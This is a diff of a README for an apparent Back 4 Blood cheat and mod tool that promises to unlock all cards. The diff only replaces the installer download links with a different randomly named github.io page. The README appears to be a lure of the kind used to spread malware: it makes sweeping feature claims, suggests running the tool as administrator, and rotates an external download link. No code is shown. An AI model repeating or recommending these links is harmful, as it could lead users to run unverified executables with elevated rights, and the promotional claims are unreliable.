@@ -2,7 +2,7 @@
 
 The Back 4 Blood Enhancement Suite is a comprehensive mod tool designed for Back 4 Blood players on Windows 10 and 11. It provides a suite of features to customize and enhance your gameplay experience, including unlocking all cards and enabling various mods. This 2026 version is fully compatible with the latest game updates and offers a user-friendly interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -77,7 +77,7 @@ If you encounter issues, try running the tool as an administrator. Ensure your s
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
